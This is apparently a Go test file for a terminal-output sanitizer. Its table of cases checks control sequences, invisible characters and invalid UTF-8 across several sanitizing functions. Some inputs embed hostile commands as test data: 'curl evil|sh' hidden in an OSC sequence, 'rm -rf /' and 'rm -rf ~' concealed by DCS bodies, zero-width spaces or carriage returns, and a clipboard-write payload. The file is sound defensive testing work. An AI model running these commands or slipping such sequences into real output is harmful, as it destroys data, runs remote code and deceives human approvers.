package render

import (
	"fmt"
	"math/rand/v2"
	"regexp"
	"slices"
	"sort"
	"strings"
	"testing"
	"unicode/utf8"
)

// T4 渲染清洗：表格测试（docs/superpowers/specs/2026-09-30-test-design.md §4.5）。
//
// Every input of the corpus goes through every outlet — VisibleControls,
// StripControls, SanitizeStream, StreamSanitizer (whole and chunked) and the
// Markdown stream renderer — and the runner checks, besides the expectations
// a case spells out, the invariants that need no per-case expectation:
//
//   - chunked == whole (StreamSanitizer, MarkdownStream): every byte, every
//     rune, every byte with empty chunks in between, 200 random splits;
//   - no outlet emits a raw ESC (SanitizeStream: none outside the SGR and
//     erase-in-line sequences it keeps), a C0 control it does not allow, or a
//     C1 control (as a rune or as a stray byte); the output is valid UTF-8
//     whenever the input is (the scanners pass invalid bytes above 0x9F
//     through on purpose, see scanControls);
//   - VisibleControls hides nothing: it is valid UTF-8, no shorter than the
//     input, and every printable rune of the input appears in it in order;
//   - emoji ZWJ sequences survive VisibleControls byte for byte.
//
// A case whose expectation is right but that the current code gets wrong is
// marked skip: "bug: ..." and reported, never weakened.

// sanCase is one corpus row. A nil expectation means "invariants only".
type sanCase struct {
	dim  string // 维度值: the sequence type
	name string
	in   string
	note string

	visible *string // VisibleControls
	strip   *string // StripControls
	stream  *string // SanitizeStream
	// streamz is StreamSanitizer (Write then Flush) for any chunking. When
	// nil and the input does not end inside a character, it must equal
	// SanitizeStream(in).
	streamz *string

	emoji bool   // an emoji sequence VisibleControls must leave byte for byte
	skip  string // "bug: ..." — honoured by the runner
}

func w(s string) *string { return &s }

// uesc is how VisibleControls shows r (a backslash, "u", four or more hex digits).
func uesc(r rune) string { return fmt.Sprintf("%cu%04x", 0x5c, r) }

// same sets every outlet's expectation to the input itself.
func same(c sanCase) sanCase {
	c.visible, c.strip, c.stream = w(c.in), w(c.in), w(c.in)
	return c
}

func tableSanitizeCorpus() []sanCase {
	var cs []sanCase
	add := func(c ...sanCase) { cs = append(cs, c...) }

	// C0: each control between two letters.
	for b := byte(0); b < 0x20; b++ {
		if b == '\n' || b == '\t' || b == '\r' || b == 0x1b {
			continue
		}
		in := "a" + string(rune(b)) + "b"
		add(sanCase{dim: "C0", name: fmt.Sprintf("C0 0x%02x", b), in: in,
			note:    "C0 控制符：可见化为脱字符，两种剥离都删除",
			visible: w("a^" + string(rune(b+0x40)) + "b"), strip: w("ab"), stream: w("ab")})
	}
	add(
		sanCase{dim: "C0", name: "DEL", in: "a\x7fb", note: "DEL 显示为 ^?",
			visible: w("a^?b"), strip: w("ab"), stream: w("ab")},
		sanCase{dim: "C0", name: "ESC before newline", in: "a\x1b\nb", note: "ESC 后跟控制符：只删 ESC，换行保留",
			visible: w(`a\e` + "\nb"), strip: w("a\nb"), stream: w("a\nb")},
		sanCase{dim: "C0", name: "newline and tab kept", in: "a\n\tb", note: "\\n \\t 三个出口都保留",
			visible: w("a\n\tb"), strip: w("a\n\tb"), stream: w("a\n\tb")},
		sanCase{dim: "C0", name: "backspace overwrite", in: "rm\b\bls", note: "退格覆盖：审批里必须看得见",
			visible: w("rm^H^Hls"), strip: w("rmls"), stream: w("rmls")},
	)

	// C1: raw 8-bit bytes and their UTF-8 form U+0080–U+009F.
	for b := 0x80; b <= 0x9f; b++ {
		add(sanCase{dim: "C1 raw", name: fmt.Sprintf("C1 raw 0x%02x", b), in: "a" + string([]byte{byte(b)}) + "b",
			note:    "8 位 C1 原始字节：可见化为 \\xNN，剥离时删除",
			visible: w(fmt.Sprintf(`a\x%02xb`, b)), strip: w("ab"), stream: w("ab")})
		add(sanCase{dim: "C1 UTF-8", name: fmt.Sprintf("C1 U+%04X", b), in: "a" + string(rune(b)) + "b",
			note:    "UTF-8 形式的 C1（含单字符 CSI U+009B / OSC U+009D）：可见化为 \\u00XX，剥离时只删引导符",
			visible: w(fmt.Sprintf(`a\u%04xb`, b)), strip: w("ab"), stream: w("ab")})
	}
	add(sanCase{dim: "C1 UTF-8", name: "8-bit CSI then params", in: "a\u009b2Jb", note: "删掉 C1 引导符即可，其后是惰性文本",
		visible: w(`a\u009b2Jb`), strip: w("a2Jb"), stream: w("a2Jb")})

	// CSI.
	kept := []string{"\x1b[31m", "\x1b[1;31m", "\x1b[38;5;196m", "\x1b[38:2::1:2:3m", "\x1b[m", "\x1b[0m", "\x1b[K", "\x1b[2K", "\x1b[0K"}
	for _, seq := range kept {
		add(sanCase{dim: "CSI kept", name: "CSI kept " + seq[1:], in: "a" + seq + "b",
			note:    "SGR 与行内擦除：SanitizeStream 保留，StripControls 删除",
			visible: w(`a\e` + seq[1:] + "b"), strip: w("ab"), stream: w("a" + seq + "b")})
	}
	dropped := []string{
		"\x1b[?1049h", "\x1b[?25l", "\x1b[>c", "\x1b[=1c", "\x1b[<0;1;2M", "\x1b[?31m", "\x1b[>4;2m",
		"\x1b[2 q", "\x1b[1\"p", "\x1b[31 m", "\x1b[!p", "\x1b[6n", "\x1b[2J", "\x1b[J", "\x1b[3A",
		"\x1b[1;1H", "\x1b[s", "\x1b[u", "\x1b[5i", "\x1b[3;4r", "\x1b[@", "\x1b[~",
	}
	for _, seq := range dropped {
		add(sanCase{dim: "CSI dropped", name: "CSI dropped " + seq[1:], in: "a" + seq + "b",
			note:    "私有参数 / 中间字节 / 非行内 CSI：两种剥离都整段删除",
			visible: w(`a\e` + seq[1:] + "b"), strip: w("ab"), stream: w("ab")})
	}
	add(
		sanCase{dim: "CSI malformed", name: "CSI ended by BEL", in: "a\x1b[1\x07b", note: "畸形 CSI：丢已解析部分，从怪字节继续",
			strip: w("ab"), stream: w("ab"), visible: w(`a\e[1^Gb`)},
		sanCase{dim: "CSI malformed", name: "CSI ended by ESC", in: "a\x1b[1\x1b[31mb", note: "畸形 CSI 后紧跟合法 SGR",
			strip: w("ab"), stream: w("a\x1b[31mb")},
		sanCase{dim: "CSI malformed", name: "CSI ended by CJK", in: "a\x1b[31文b", note: "畸形 CSI 不吞后面的多字节字符",
			strip: w("a文b"), stream: w("a文b"), visible: w(`a\e[31文b`)},
		sanCase{dim: "CSI malformed", name: "CSI ended by DEL", in: "a\x1b[3\x7fb", note: "终结字节越界（DEL）",
			strip: w("ab"), stream: w("ab")},
		sanCase{dim: "CSI overlong", name: "CSI 253 params kept", in: "a\x1b[" + strings.Repeat("1", 253) + "mb",
			note:   "maxPendingSequence 边界内：仍是合法 SGR",
			stream: w("a\x1b[" + strings.Repeat("1", 253) + "mb"), strip: w("ab")},
		sanCase{dim: "CSI overlong", name: "CSI 254 params overlong", in: "a\x1b[" + strings.Repeat("1", 254) + "mb",
			note:   "超过 maxPendingSequence：只丢引导符，参数按文本输出",
			stream: w("a" + strings.Repeat("1", 254) + "mb"), strip: w("a" + strings.Repeat("1", 254) + "mb")},
		sanCase{dim: "CSI overlong", name: "CSI 300 param pairs", in: "a\x1b[" + strings.Repeat("1;", 300) + "mb",
			note:   "超长参数表",
			stream: w("a" + strings.Repeat("1;", 300) + "mb"), strip: w("a" + strings.Repeat("1;", 300) + "mb")},
		sanCase{dim: "CSI overlong", name: "CSI long intermediates", in: "a\x1b[1" + strings.Repeat(" ", 300) + "qb",
			note:   "超长中间字节",
			stream: w("a1" + strings.Repeat(" ", 300) + "qb")},
	)

	// OSC / DCS / SOS / PM / APC × every terminator.
	strs := []struct{ kind, body string }{
		{"OSC 0", "]0;title"},
		{"OSC 8", "]8;;https://evil.example"},
		{"OSC 52", "]52;c;cm0gLXJmIH4="},
		{"OSC 133", "]133;A"},
		{"DCS", "P1$r"},
		{"SOS", "Xsos body"},
		{"PM", "^pm body"},
		{"APC", "_apc body"},
	}
	terms := []struct{ name, raw, shown string }{
		{"BEL", "\x07", "^G"},
		{"ESC \\", "\x1b\\", `\e\`},
		{"0x9C", "\x9c", `\x9c`},
		{"C2 9C", "\xc2\x9c", `\u009c`},
	}
	for _, s := range strs {
		for _, tm := range terms {
			add(sanCase{dim: s.kind + " / " + tm.name, name: s.kind + " ended by " + tm.name,
				in:      "a\x1b" + s.body + tm.raw + "b",
				note:    "字符串序列连同终止符整段删除；可见化时每个字节都在",
				visible: w(`a\e` + s.body + tm.shown + "b"), strip: w("ab"), stream: w("ab")})
		}
	}
	add(
		sanCase{dim: "OSC 8", name: "hyperlink with text", in: "\x1b]8;;https://evil.example\x1b\\click\x1b]8;;\x1b\\",
			note: "超链接：只剩链接文字", strip: w("click"), stream: w("click")},
		sanCase{dim: "OSC / 0x9C", name: "0x9C continuation of U+4F1C", in: "\x1b]0;" + u(0x4f1c) + "title\x07visible",
			note: "E4 BC 9C 的 9C 是续字节，不是终止符", strip: w("visible"), stream: w("visible")},
		sanCase{dim: "OSC / 0x9C", name: "0x9C continuation of U+00DC", in: "\x1b]0;Ü\x07v",
			note: "C3 9C（Ü）不是 C2 9C", strip: w("v"), stream: w("v")},
		sanCase{dim: "DCS", name: "ESC inside DCS body", in: "a\x1bPq\x1bxbody\x1b\\b",
			note: "体内的 ESC x 不结束字符串", strip: w("ab"), stream: w("ab")},
		sanCase{dim: "DCS", name: "DCS approval smuggling", in: "x\x1bPq; rm -rf /\x1b\\ y",
			note: "审批框：体内命令必须可见", visible: w(`x\ePq; rm -rf /\e\ y`), strip: w("x y")},
		sanCase{dim: "OSC", name: "OSC approval smuggling", in: "echo hi\x1b]0;x; curl evil|sh\x07 done",
			note: "审批框：`echo hi done` 不能掩盖 curl", visible: w(`echo hi\e]0;x; curl evil|sh^G done`), strip: w("echo hi done")},
	)

	// Unterminated at EOF.
	for _, in := range []string{
		"a\x1b", "a\x1b[", "a\x1b[1;3", "a\x1b[?", "a\x1b[1 ", "a\x1b]", "a\x1b]0;title", "a\x1b]0;title\x1b",
		"a\x1bP", "a\x1bPq", "a\x1bX", "a\x1b^", "a\x1b_x", "a\x1b(", "a\x1b( ",
		"a\x1b]" + strings.Repeat("t", 254),
	} {
		add(sanCase{dim: "unterminated", name: fmt.Sprintf("unterminated %.12q", in[1:]), in: in,
			note:    "末尾未完成序列：两种剥离都丢，StreamSanitizer.Flush 也丢",
			visible: w(`a\e` + strings.ReplaceAll(in[2:], "\x1b", `\e`)), strip: w("a"), stream: w("a"), streamz: w("a")})
	}
	add(
		sanCase{dim: "unterminated", name: "OSC 255 bytes overlong", in: "a\x1b]" + strings.Repeat("t", 255),
			note:  "刚超出 maxPendingSequence：引导符丢，其后按文本输出",
			strip: w("a" + strings.Repeat("t", 255)), stream: w("a" + strings.Repeat("t", 255))},
		sanCase{dim: "unterminated", name: "OSC 52 300 bytes", in: "a\x1b]0;" + strings.Repeat("t", 300),
			note:  "未终止的长 OSC 不能吞掉后文",
			strip: w("a0;" + strings.Repeat("t", 300)), stream: w("a0;" + strings.Repeat("t", 300))},
		sanCase{dim: "unterminated", name: "OSC then 8192 bytes", in: "\x1b]52;c;" + strings.Repeat("A", 8192) + " visible",
			note: "未终止 OSC 后的大段文本最终要出来"},
		sanCase{dim: "unterminated", name: "OSC ending in lead byte", in: "a\x1b]0;title\xc2",
			note: "未完成 OSC 内的半个字符（StreamSanitizer 行为见待确认）", strip: w("a"), stream: w("a")},
	)

	// nF and two-byte escapes.
	for _, seq := range []string{"\x1b(0", "\x1b(B", "\x1b)0", "\x1b#8", "\x1b%G", "\x1b 7", "\x1b7", "\x1b8", "\x1bc", "\x1bM", "\x1bD", "\x1b=", "\x1b>", "\x1b;", "\x1b|"} {
		add(sanCase{dim: "nF / Fp / Fs", name: "escape " + seq[1:], in: "a" + seq + "b",
			note:    "字符集切换 / 两字节序列：剥离时删除，可见化时 ESC 显示为 \\e 且后续字节不丢",
			visible: w(`a\e` + seq[1:] + "b"), strip: w("ab"), stream: w("ab")})
	}
	add(
		sanCase{dim: "nF / Fp / Fs", name: "ESC & eats final", in: "a\x1b&d",
			note: "ESC & 是 nF 引导，下一字节是其终结符（这正是审批改用 VisibleControls 的原因）", visible: w(`a\e&d`), strip: w("a")},
		sanCase{dim: "nF / Fp / Fs", name: "nF overlong", in: "a\x1b" + strings.Repeat(" ", 300) + "0b",
			note: "超长 nF：只丢 ESC 与首个中间字节", stream: w("a" + strings.Repeat(" ", 299) + "0b")},
		sanCase{dim: "ESC + other", name: "ESC before CJK", in: "a\x1b文b",
			note: "ESC 后跟非 ASCII：只丢 ESC", visible: w(`a\e文b`), strip: w("a文b"), stream: w("a文b")},
		sanCase{dim: "ESC + other", name: "ESC ESC SGR", in: "a\x1b\x1b[31mb",
			note: "双 ESC：第一个单独丢", strip: w("ab"), stream: w("a\x1b[31mb"), visible: w(`a\e\e[31mb`)},
		sanCase{dim: "ESC + other", name: "ESC DEL", in: "a\x1b\x7fb", note: "ESC 后跟 DEL", strip: w("ab"), stream: w("ab"), visible: w(`a\e^?b`)},
	)

	// Zero-width, bidi, tag and format characters.
	invisible := []rune{0x200b, 0x200c, 0x200d, 0x2060, 0x2061, 0x2062, 0x2063, 0x2064, 0xfeff, 0x00ad, 0x180e, 0x034f,
		0x115f, 0x1160, 0x3164, 0xffa0, 0xfff9, 0xfffa, 0xfffb,
		0x202a, 0x202b, 0x202c, 0x202d, 0x202e, 0x2066, 0x2067, 0x2068, 0x2069, 0x200e, 0x200f, 0x061c, 0x2028, 0x2029,
		0xe0000, 0xe0001, 0xe0020, 0xe0041, 0xe007e, 0xe007f}
	for _, r := range invisible {
		in := "a" + string(r) + "b"
		add(sanCase{dim: "invisible", name: fmt.Sprintf("invisible U+%04X", r), in: in,
			note:    "零宽 / 双向 / 标签 / 格式字符：审批里显示为 \\uXXXX；两种剥离只管控制序列，原样放行",
			visible: w(fmt.Sprintf(`a\u%04xb`, r)), strip: w(in), stream: w(in)})
	}
	add(sanCase{dim: "invisible", name: "ZWSP comment trick", in: "echo hi " + u(0x200b) + "#; rm -rf ~",
		note: "零宽空格让 # 看似注释", visible: w("echo hi " + uesc(0x200b) + "#; rm -rf ~")})
	add(sanCase{dim: "invisible", name: "RLO reversal", in: "a" + u(0x202e) + "b", note: "RLO 反转显示", visible: w("a" + uesc(0x202e) + "b")})
	for _, s := range []string{u('a', zwj, 'b'), u(man, zwj, '#'), u('#', zwj, woman), u(zwj, woman), u(man, zwj)} {
		add(sanCase{dim: "invisible", name: fmt.Sprintf("stray ZWJ %+q", s), in: s,
			note:    "不在 emoji 序列中的 ZWJ 要显示",
			visible: w(strings.ReplaceAll(s, u(zwj), uesc(zwj))), strip: w(s), stream: w(s)})
	}

	// Invalid UTF-8, between two letters and at EOF.
	invalid := []struct{ name, bad, strip, visible string }{
		{"lone continuation 0xBF", "\xbf", "\xbf", `\xbf`},
		{"lone continuation 0xA0", "\xa0", "\xa0", `\xa0`},
		{"truncated 2-byte", "\xc3", "\xc3", `\xc3`},
		{"truncated 3-byte", "\xe6\x96", "\xe6", `\xe6\x96`},
		{"truncated 4-byte", "\xf0\x9f\x98", "\xf0", `\xf0\x9f\x98`},
		{"overlong 2-byte slash", "\xc0\xaf", "\xc0\xaf", `\xc0\xaf`},
		{"overlong 3-byte slash", "\xe0\x80\xaf", "\xe0\xaf", `\xe0\x80\xaf`},
		{"overlong 4-byte slash", "\xf0\x80\x80\xaf", "\xf0\xaf", `\xf0\x80\x80\xaf`},
		{"overlong C1 CSI", "\xc1\x9b", "\xc1", `\xc1\x9b`},
		{"surrogate high", "\xed\xa0\x80", "\xed\xa0", `\xed\xa0\x80`},
		{"surrogate low", "\xed\xbf\xbf", "\xed\xbf\xbf", `\xed\xbf\xbf`},
		{"above U+10FFFF", "\xf4\x90\x80\x80", "\xf4", `\xf4\x90\x80\x80`},
		{"0xFF", "\xff", "\xff", `\xff`},
		{"0xFE", "\xfe", "\xfe", `\xfe`},
	}
	for _, v := range invalid {
		add(sanCase{dim: "invalid UTF-8", name: v.name, in: "a" + v.bad + "b",
			note:    "非法字节：0x80–0x9F 当 C1 删，其余交给终端显示替换符；VisibleControls 显示 \\xNN",
			visible: w("a" + v.visible + "b"), strip: w("a" + v.strip + "b"), stream: w("a" + v.strip + "b")})
	}
	for _, v := range []struct{ name, bad, strip string }{
		{"EOF truncated 2-byte", "\xc3", "\xc3"},
		{"EOF truncated 3-byte", "\xe6\x96", "\xe6"},
		{"EOF truncated 4-byte", "\xf0\x9f\x98", "\xf0"},
	} {
		add(sanCase{dim: "invalid UTF-8 at EOF", name: v.name, in: "a" + v.bad,
			note:  "流在字符中间结束：Flush 输出 U+FFFD",
			strip: w("a" + v.strip), stream: w("a" + v.strip), streamz: w("a�")})
	}
	add(sanCase{dim: "invalid UTF-8 at EOF", name: "EOF 0xFF", in: "a\xff", note: "0xFF 永远不会成为字符，不被扣留",
		strip: w("a\xff"), stream: w("a\xff"), streamz: w("a\xff")})
	add(sanCase{dim: "invalid UTF-8", name: "lead then BEL then continuation", in: "\xe6\x07\x96\x87",
		note: "删除控制符后非法前导字节与续字节拼接（只查不变量）"})

	// Wide characters and emoji sequences.
	for _, e := range []struct {
		name, s string
		zwj     bool
	}{
		{"CJK wide", "中文 テスト 한국어 ｆｕｌｌ", false},
		{"thumbs skin tone", "\U0001F44D\U0001F3FD", false},
		{"flags", "\U0001F1E8\U0001F1F3\U0001F1FA\U0001F1F8", false},
		{"heart VS16", "❤️", false},
		{"keycap", "1️⃣", false},
		{"family ZWJ", u(man, zwj, woman, zwj, girl), true},
		{"technologist skin ZWJ", u(man, 0x1f3fd, zwj, 0x1f4bb), true},
		{"woman technologist skin ZWJ", u(woman, 0x1f3fd, zwj, 0x1f4bb), true},
		{"rainbow flag", u(0x1f3f3, vs16, zwj, 0x1f308), true},
		{"transgender flag", u(0x1f3f3, vs16, zwj, 0x26a7, vs16), true},
		{"heart on fire", u(0x2764, vs16, zwj, 0x1f525), true},
		{"mending heart", u(0x2764, vs16, zwj, 0x1fa79), true},
		{"people holding hands", u(0x1f9d1, zwj, 0x1f91d, zwj, 0x1f9d1), true},
		{"eye in speech bubble", u(0x1f441, vs16, zwj, 0x1f5e8, vs16), true},
		{"couple kiss skin tones", u(0x1f469, 0x1f3fb, zwj, 0x2764, vs16, zwj, 0x1f48b, zwj, 0x1f468, 0x1f3ff), true},
	} {
		c := same(sanCase{dim: "emoji / wide", name: e.name, in: "ok " + e.s + " 好", emoji: e.zwj,
			note: "宽字符与 emoji 序列：三个出口原样保留"})
		add(c)
	}
	england := u(0x1f3f4, 0xe0067, 0xe0062, 0xe0065, 0xe006e, 0xe0067, 0xe007f)
	add(sanCase{dim: "emoji / wide", name: "tag flag England", in: england,
		note:    "标签序列旗帜：标签字符属 isInvisible，按注释显示为 \\uXXXX（体验问题见待确认）",
		visible: w(u(0x1f3f4) + uesc(0xe0067) + uesc(0xe0062) + uesc(0xe0065) + uesc(0xe006e) + uesc(0xe0067) + uesc(0xe007f)), strip: w(england), stream: w(england)})

	// CR / CRLF.
	add(
		sanCase{dim: "CR", name: "CRLF", in: "a\r\nb", note: "CRLF：流保留 \\r，单行剥离删除",
			visible: w("a^M\nb"), strip: w("a\nb"), stream: w("a\r\nb")},
		sanCase{dim: "CR", name: "lone CR", in: "rm -rf ~\rls -la", note: "单独 CR 回到行首覆盖：审批里显示 ^M",
			visible: w("rm -rf ~^Mls -la"), strip: w("rm -rf ~ls -la"), stream: w("rm -rf ~\rls -la")},
		sanCase{dim: "CR", name: "progress bar", in: "10%\r\x1b[K20%\r\x1b[K done\n", note: "进度条重绘本行",
			stream: w("10%\r\x1b[K20%\r\x1b[K done\n"), strip: w("10%20% done\n")},
		sanCase{dim: "CR", name: "trailing CR", in: "line\r", stream: w("line\r"), strip: w("line")},
	)

	// Mixed Chinese text.
	add(
		sanCase{dim: "mixed CJK", name: "colour and bell in Chinese", in: "中文\x1b[31m红色\x1b[0m\x07结束",
			note:    "中文与控制序列混排",
			visible: w(`中文\e[31m红色\e[0m^G结束`), strip: w("中文红色结束"), stream: w("中文\x1b[31m红色\x1b[0m结束")},
		sanCase{dim: "mixed CJK", name: "OSC title in Chinese", in: "看\x1b]0;标题\x07这里\n第二行",
			visible: w(`看\e]0;标题^G这里` + "\n第二行"), strip: w("看这里\n第二行"), stream: w("看这里\n第二行")},
		same(sanCase{dim: "mixed CJK", name: "plain Chinese", in: "第一行\n\tsecond ✓ line，全角。"}),
		sanCase{dim: "mixed CJK", name: "go test output", in: "\x1b[32mok\x1b[0m  pkg\r\x1b[Kdone\n\x1b[1;31mFAIL\x1b[m\t1.2s",
			note: "现有用例：带颜色的工具输出原样通过", stream: w("\x1b[32mok\x1b[0m  pkg\r\x1b[Kdone\n\x1b[1;31mFAIL\x1b[m\t1.2s")},
		same(sanCase{dim: "mixed CJK", name: "empty", in: ""}),
	)

	// Folded in from the existing tests: hostile sequences and long inputs
	// (invariants only; the existing tests keep their own assertions).
	names := make([]string, 0, len(hostileSequences))
	for k := range hostileSequences {
		names = append(names, k)
	}
	sort.Strings(names)
	for _, k := range names {
		add(sanCase{dim: "hostile (sanitize_test.go)", name: "hostile " + k, in: "a" + hostileSequences[k] + "b",
			note: "迁入 hostileSequences"})
	}
	for i, in := range []string{
		"before \x1b]52;c;" + strings.Repeat("A", 300) + "\x07 after",
		"before \x1b]52;c;" + strings.Repeat("A", 3000) + "\x07 after",
		"x\x1b]0;" + strings.Repeat("B", 400) + "\x1b\\y",
		"p\x1b[" + strings.Repeat("1;", 600) + "mq",
		"n\x1b" + strings.Repeat(" ", 900) + "0m",
		strings.Repeat("\x1b]", 700) + "tail",
		strings.Repeat("\x1b[", 400) + "tail",
		"文件 ok",
	} {
		add(sanCase{dim: "long (sanitize_test.go)", name: fmt.Sprintf("long input %d", i), in: in,
			note: "迁入 TestStreamSanitizerTreatsALongSequenceTheSameWhateverTheChunking"})
	}
	return cs
}

// chunking is one way to cut an input into Write calls.
type chunking struct {
	name  string
	parts []string
}

// chunkSeed is fixed so every run cuts the same way.
const chunkSeed = 0x7434

// chunkings returns the whole input, every byte, every byte with empty
// chunks between, every rune (invalid bytes on their own) and randomSplits
// random cuttings seeded by chunkSeed and idx.
func chunkings(in string, idx int, randomSplits int) []chunking {
	cs := []chunking{{"whole", []string{in}}}
	if len(in) < 2 {
		return cs
	}
	var bytes, empties, runes []string
	for i := 0; i < len(in); i++ {
		bytes = append(bytes, in[i:i+1])
		empties = append(empties, "", in[i:i+1])
	}
	for i := 0; i < len(in); {
		_, n := utf8.DecodeRuneInString(in[i:])
		runes = append(runes, in[i:i+n])
		i += n
	}
	cs = append(cs, chunking{"every byte", bytes}, chunking{"every byte + empty", empties}, chunking{"every rune", runes})
	rng := rand.New(rand.NewPCG(chunkSeed, uint64(idx)))
	for k := 0; k < randomSplits; k++ {
		n := 1 + rng.IntN(min(len(in)-1, 16))
		cuts := make([]int, n)
		for j := range cuts {
			cuts[j] = 1 + rng.IntN(len(in)-1)
		}
		slices.Sort(cuts)
		var parts []string
		prev := 0
		for _, c := range cuts {
			parts = append(parts, in[prev:c])
			prev = c
		}
		parts = append(parts, in[prev:])
		cs = append(cs, chunking{fmt.Sprintf("random #%d cuts=%v", k, cuts), parts})
	}
	return cs
}

func runStreamSanitizer(parts []string) string {
	var z StreamSanitizer
	var sb strings.Builder
	for _, p := range parts {
		sb.WriteString(z.Write(p))
	}
	sb.WriteString(z.Flush())
	return sb.String()
}

func runMarkdown(g mdGlyphs, parts []string) string {
	m := &MarkdownStream{g: g}
	var sb strings.Builder
	for _, p := range parts {
		sb.WriteString(m.Write(p))
	}
	sb.WriteString(m.Flush())
	return sb.String()
}

// keptStyle matches the sequences SanitizeStream lets through.
var keptStyle = regexp.MustCompile(`\x1b\[[0-9;:]*[mK]`)

// violations lists what out must not contain. allowCR admits '\r';
// allowStyle admits the SGR / erase-in-line sequences SanitizeStream keeps;
// wantValid requires valid UTF-8.
func violations(out string, allowCR, allowStyle, wantValid bool) []string {
	var v []string
	if allowStyle {
		out = keptStyle.ReplaceAllString(out, "")
	}
	for i := 0; i < len(out); {
		b := out[i]
		switch {
		case b == 0x1b:
			v = append(v, fmt.Sprintf("raw ESC at %d", i))
		case b == '\r' && !allowCR:
			v = append(v, fmt.Sprintf("raw CR at %d", i))
		case (b < 0x20 && b != '\n' && b != '\t' && b != '\r') || b == 0x7f:
			v = append(v, fmt.Sprintf("C0 0x%02x at %d", b, i))
		}
		r, n := utf8.DecodeRuneInString(out[i:])
		if r == utf8.RuneError && n == 1 && b >= 0x80 && b <= 0x9f {
			v = append(v, fmt.Sprintf("stray C1 byte 0x%02x at %d", b, i))
		} else if r >= 0x80 && r <= 0x9f {
			v = append(v, fmt.Sprintf("C1 rune U+%04X at %d", r, i))
		}
		i += n
	}
	if wantValid && !utf8.ValidString(out) {
		v = append(v, "invalid UTF-8")
	}
	return v
}

// printableRunes are the input runes VisibleControls must show as they are.
func printableRunes(in string) []string {
	var rs []string
	for i := 0; i < len(in); {
		r, n := utf8.DecodeRuneInString(in[i:])
		switch {
		case r == utf8.RuneError && n == 1:
		case r < 0x20 && r != '\n' && r != '\t', r == 0x7f, r >= 0x80 && r <= 0x9f:
		case isInvisible(r), isInvisibleFormatting(r):
		default:
			rs = append(rs, in[i:i+n])
		}
		i += n
	}
	return rs
}

func TestTableSanitize(t *testing.T) {
	corpus := tableSanitizeCorpus()
	for idx, c := range corpus {
		t.Run(fmt.Sprintf("%03d %s", idx, c.name), func(t *testing.T) {
			if c.skip != "" {
				t.Skip(c.skip)
			}
			ctx := fmt.Sprintf("in=%.200q dim=%q note=%q", c.in, c.dim, c.note)
			if len(c.in) > 200 {
				ctx = fmt.Sprintf("in=%.200q...(len %d) dim=%q note=%q", c.in, len(c.in), c.dim, c.note)
			}
			check := func(outlet, chunk, got string, want *string) {
				t.Helper()
				if want != nil && got != *want {
					t.Errorf("%s outlet=%s chunking=%s\n got %q\nwant %q", ctx, outlet, chunk, got, *want)
				}
			}
			inValid := utf8.ValidString(c.in)

			vis := VisibleControls(c.in)
			strip := StripControls(c.in)
			stream := SanitizeStream(c.in)
			check("VisibleControls", "whole", vis, c.visible)
			check("StripControls", "whole", strip, c.strip)
			check("SanitizeStream", "whole", stream, c.stream)

			// (b) nothing raw leaves any outlet.
			for _, o := range []struct {
				name              string
				out               string
				allowCR, keep, ok bool
			}{
				{"VisibleControls", vis, false, false, true},
				{"StripControls", strip, false, false, inValid},
				{"SanitizeStream", stream, true, true, inValid},
			} {
				if v := violations(o.out, o.allowCR, o.keep, o.ok); len(v) > 0 {
					t.Errorf("%s outlet=%s chunking=whole: %v\n got %q", ctx, o.name, v, o.out)
				}
			}
			for i := 0; i < len(vis); {
				r, n := utf8.DecodeRuneInString(vis[i:])
				if (isInvisible(r) || isInvisibleFormatting(r)) && !(r == zwj && joinsEmoji(vis, i, n)) {
					t.Errorf("%s outlet=VisibleControls: invisible U+%04X shown raw at %d\n got %q", ctx, r, i, vis)
				}
				i += n
			}

			// (c) VisibleControls hides nothing and only grows.
			if len(vis) < len(c.in) {
				t.Errorf("%s outlet=VisibleControls: output shorter than input (%d < %d)\n got %q", ctx, len(vis), len(c.in), vis)
			}
			pr := printableRunes(c.in)
			if n := utf8.RuneCountInString(vis); n < len(pr) {
				t.Errorf("%s outlet=VisibleControls: %d runes out < %d printable runes in", ctx, n, len(pr))
			}
			pos := 0
			for k, r := range pr {
				j := strings.Index(vis[pos:], r)
				if j < 0 {
					t.Errorf("%s outlet=VisibleControls: printable rune #%d %q missing or out of order after byte %d\n got %q", ctx, k, r, pos, vis)
					break
				}
				pos += j + len(r)
			}

			// (d) emoji ZWJ sequences survive byte for byte.
			if c.emoji && !strings.Contains(vis, strings.TrimSuffix(strings.TrimPrefix(c.in, "ok "), " 好")) {
				t.Errorf("%s outlet=VisibleControls: emoji sequence changed\n got %q", ctx, vis)
			}

			// Cross-outlet: removing what SanitizeStream keeps gives
			// StripControls (valid input only: dropping a control between
			// two stray bytes may join them into a character, by design).
			if inValid {
				if got := StripControls(stream); got != strip {
					t.Errorf("%s outlet=StripControls∘SanitizeStream vs StripControls\n got %q\nwant %q", ctx, got, strip)
				}
			}

			// (a) StreamSanitizer: every chunking agrees with the whole.
			whole := runStreamSanitizer([]string{c.in})
			want := c.streamz
			if want == nil && incompleteRuneSuffix(c.in) == "" {
				want = &stream
			}
			check("StreamSanitizer", "whole", whole, want)
			if v := violations(whole, true, true, inValid); len(v) > 0 {
				t.Errorf("%s outlet=StreamSanitizer chunking=whole: %v\n got %q", ctx, v, whole)
			}
			mdRaw := runMarkdown(mdUnicode, []string{c.in})
			mdSan := runMarkdown(mdUnicode, []string{whole})
			sanFails, rawFails, sanMDFails := 0, 0, 0
			for _, ch := range chunkings(c.in, idx, 200)[1:] {
				if got := runStreamSanitizer(ch.parts); got != whole && sanFails < 3 {
					sanFails++
					t.Errorf("%s outlet=StreamSanitizer chunking=%s\n got %q\nwant %q (whole)", ctx, ch.name, got, whole)
				}
				if got := runMarkdown(mdUnicode, ch.parts); got != mdRaw && rawFails < 3 {
					rawFails++
					t.Errorf("%s outlet=MarkdownStream(raw) chunking=%s\n got %q\nwant %q (whole)", ctx, ch.name, got, mdRaw)
				}
			}
			// The Markdown renderer as it is used: on sanitised text.
			for _, ch := range chunkings(whole, idx, 50)[1:] {
				if got := runMarkdown(mdUnicode, ch.parts); got != mdSan && sanMDFails < 3 {
					sanMDFails++
					t.Errorf("%s outlet=MarkdownStream(sanitised %q) chunking=%s\n got %q\nwant %q (whole)", ctx, whole, ch.name, got, mdSan)
				}
			}
		})
	}
}
